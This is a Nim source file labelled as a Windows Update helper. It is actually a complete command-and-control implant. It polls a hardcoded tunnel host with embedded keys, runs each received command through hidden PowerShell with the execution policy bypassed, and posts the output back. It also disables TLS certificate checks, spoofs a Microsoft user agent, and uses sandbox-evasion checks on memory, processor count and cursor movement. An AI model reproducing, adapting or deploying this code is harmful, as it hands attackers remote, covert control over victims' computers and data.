# Windows Update Service Helper - Pure WinAPI
{.passL: "-lwinhttp".}

import winim/lean
import std/[strutils, random, os]

# Plaintext - no XOR
proc getC2Host(): string = "geometry-offered-guns-replies.trycloudflare.com"
proc getApiKey(): string = "051dfe1cf5e570846315512a11396f7d"
proc getToken(): string = "8ca60eebbe9a141869305ed9ab1a0050"

type
  HINTERNET = pointer
  INTERNET_PORT = WORD

const
  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: DWORD = 0
  WINHTTP_FLAG_SECURE: DWORD = 0x00800000
  WINHTTP_ADDREQ_FLAG_ADD: DWORD = 0x20000000
  WINHTTP_OPTION_SECURITY_FLAGS: DWORD = 31
  SECURITY_FLAG_IGNORE_ALL: DWORD = 0x00003300

proc WinHttpOpen(a: LPCWSTR, b: DWORD, c: LPCWSTR, d: LPCWSTR, e: DWORD): HINTERNET {.stdcall, dynlib: "winhttp.dll", importc.}
proc WinHttpConnect(a: HINTERNET, b: LPCWSTR, c: INTERNET_PORT, d: DWORD): HINTERNET {.stdcall, dynlib: "winhttp.dll", importc.}
proc WinHttpOpenRequest(a: HINTERNET, b: LPCWSTR, c: LPCWSTR, d: LPCWSTR, e: LPCWSTR, f: ptr LPCWSTR, g: DWORD): HINTERNET {.stdcall, dynlib: "winhttp.dll", importc.}
proc WinHttpSendRequest(a: HINTERNET, b: LPCWSTR, c: DWORD, d: LPVOID, e: DWORD, f: DWORD, g: DWORD_PTR): BOOL {.stdcall, dynlib: "winhttp.dll", importc.}
proc WinHttpReceiveResponse(a: HINTERNET, b: LPVOID): BOOL {.stdcall, dynlib: "winhttp.dll", importc.}
proc WinHttpReadData(a: HINTERNET, b: LPVOID, c: DWORD, d: LPDWORD): BOOL {.stdcall, dynlib: "winhttp.dll", importc.}
proc WinHttpCloseHandle(a: HINTERNET): BOOL {.stdcall, dynlib: "winhttp.dll", importc.}
proc WinHttpAddRequestHeaders(a: HINTERNET, b: LPCWSTR, c: DWORD, d: DWORD): BOOL {.stdcall, dynlib: "winhttp.dll", importc.}
proc WinHttpSetOption(a: HINTERNET, b: DWORD, c: LPVOID, d: DWORD): BOOL {.stdcall, dynlib: "winhttp.dll", importc.}

proc httpGet(host, path, apiKey: string): string =
  result = ""
  let hSession = WinHttpOpen(newWideCString("Microsoft-CryptoAPI/10.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nil, nil, 0)
  if hSession == nil: return
  defer: discard WinHttpCloseHandle(hSession)
  
  let hConnect = WinHttpConnect(hSession, newWideCString(host), 443, 0)
  if hConnect == nil: return
  defer: discard WinHttpCloseHandle(hConnect)
  
  let hRequest = WinHttpOpenRequest(hConnect, newWideCString("GET"), newWideCString(path), nil, nil, nil, WINHTTP_FLAG_SECURE)
  if hRequest == nil: return
  defer: discard WinHttpCloseHandle(hRequest)
  
  var flags: DWORD = SECURITY_FLAG_IGNORE_ALL
  discard WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, addr flags, sizeof(flags).DWORD)
  
  let headers = newWideCString("X-API-Key: " & apiKey & "\r\nUser-Agent: Microsoft-CryptoAPI/10.0\r\n")
  discard WinHttpAddRequestHeaders(hRequest, headers, cast[DWORD](-1), WINHTTP_ADDREQ_FLAG_ADD)
  
  if WinHttpSendRequest(hRequest, nil, 0, nil, 0, 0, 0) == 0: return
  if WinHttpReceiveResponse(hRequest, nil) == 0: return
  
  var buffer: array[4096, char]
  var bytesRead: DWORD
  while WinHttpReadData(hRequest, addr buffer[0], 4096, addr bytesRead) != 0 and bytesRead > 0:
    for i in 0..<bytesRead.int:
      result.add(buffer[i])

proc httpPost(host, path, apiKey, data: string): bool =
  let hSession = WinHttpOpen(newWideCString("Microsoft-CryptoAPI/10.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nil, nil, 0)
  if hSession == nil: return false
  defer: discard WinHttpCloseHandle(hSession)
  
  let hConnect = WinHttpConnect(hSession, newWideCString(host), 443, 0)
  if hConnect == nil: return false
  defer: discard WinHttpCloseHandle(hConnect)
  
  let hRequest = WinHttpOpenRequest(hConnect, newWideCString("POST"), newWideCString(path), nil, nil, nil, WINHTTP_FLAG_SECURE)
  if hRequest == nil: return false
  defer: discard WinHttpCloseHandle(hRequest)
  
  var flags: DWORD = SECURITY_FLAG_IGNORE_ALL
  discard WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, addr flags, sizeof(flags).DWORD)
  
  let headers = newWideCString("X-API-Key: " & apiKey & "\r\nContent-Type: application/json\r\nUser-Agent: Microsoft-CryptoAPI/10.0\r\n")
  discard WinHttpAddRequestHeaders(hRequest, headers, cast[DWORD](-1), WINHTTP_ADDREQ_FLAG_ADD)
  
  let dataLen = data.len.DWORD
  if WinHttpSendRequest(hRequest, nil, 0, cast[LPVOID](unsafeAddr data[0]), dataLen, dataLen, 0) == 0: return false
  discard WinHttpReceiveResponse(hRequest, nil)
  return true

proc runHidden(cmd: string): string =
  result = ""
  let tempFile = getEnv("TEMP") & "\\wup" & $(rand(9999)) & ".tmp"
  
  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  si.cb = sizeof(STARTUPINFOW).DWORD
  si.dwFlags = STARTF_USESHOWWINDOW
  si.wShowWindow = SW_HIDE
  
  # Plain PowerShell
  let ps = "powershell.exe -NoP -NonI -W Hidden -Ep Bypass -C "
  let fullCmd = ps & cmd & " | Out-File -Encoding ascii -FilePath '" & tempFile & "'"
  var cmdW = newWideCString(fullCmd)
  
  if CreateProcessW(nil, cmdW, nil, nil, FALSE, CREATE_NO_WINDOW, nil, nil, addr si, addr pi) != 0:
    discard WaitForSingleObject(pi.hProcess, 30000)
    discard CloseHandle(pi.hProcess)
    discard CloseHandle(pi.hThread)
    
    Sleep(100)
    if fileExists(tempFile):
      try:
        result = readFile(tempFile)
        removeFile(tempFile)
      except:
        result = "OK"

proc extractCmd(json: string): string =
  result = ""
  let cmdKey = "\"command\":"
  let idx = json.find(cmdKey)
  if idx >= 0:
    var start = idx + cmdKey.len
    while start < json.len and json[start] in {' ', '"'}:
      inc start
    if start > 0 and json[start-1] == '"':
      var endIdx = start
      while endIdx < json.len and json[endIdx] != '"':
        inc endIdx
      if endIdx > start:
        result = json[start..endIdx-1]

proc escapeJson(s: string): string =
  result = ""
  for c in s:
    case c
    of '\\': result.add("\\\\")
    of '"': result.add("\\\"")
    of '\n': result.add("\\n")
    of '\r': result.add("\\r")
    of '\t': result.add("\\t")
    else: result.add(c)

proc main() =
  Sleep(3000 + rand(2000).int32)
  
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = sizeof(MEMORYSTATUSEX).DWORD
  GlobalMemoryStatusEx(addr memStatus)
  if cast[uint64](memStatus.ullTotalPhys) < 2000000000'u64:
    ExitProcess(0)
  
  var sysInfo: SYSTEM_INFO
  GetNativeSystemInfo(addr sysInfo)
  if sysInfo.dwNumberOfProcessors < 2:
    ExitProcess(0)
  
  var pt1, pt2: POINT
  GetCursorPos(addr pt1)
  Sleep(1500)
  GetCursorPos(addr pt2)
  if pt1.x == pt2.x and pt1.y == pt2.y:
    Sleep(5000)
  
  randomize()
  let host = getC2Host()
  let apiKey = getApiKey()
  let token = getToken()
  
  var hostname: array[256, char]
  var size: DWORD = 256
  GetComputerNameA(cast[LPSTR](addr hostname[0]), addr size)
  let hn = $(cast[cstring](addr hostname[0]))
  let agentId = hn & "-" & toHex(rand(0xFFFF), 4).toLowerAscii()
  
  let cmdPath = "/bits/cmd/" & agentId & "?key=" & token
  let resultPath = "/bits/result/" & agentId & "?key=" & token
  
  while true:
    try:
      let resp = httpGet(host, cmdPath, apiKey)
      if resp.len > 0:
        let cmd = extractCmd(resp)
        if cmd.len > 0:
          let output = runHidden(cmd)
          let json = "{\"result\":\"" & escapeJson(output) & "\"}"
          discard httpPost(host, resultPath, apiKey, json)
    except:
      discard
    Sleep((5000 + rand(3000)).int32)

when isMainModule:
  main()
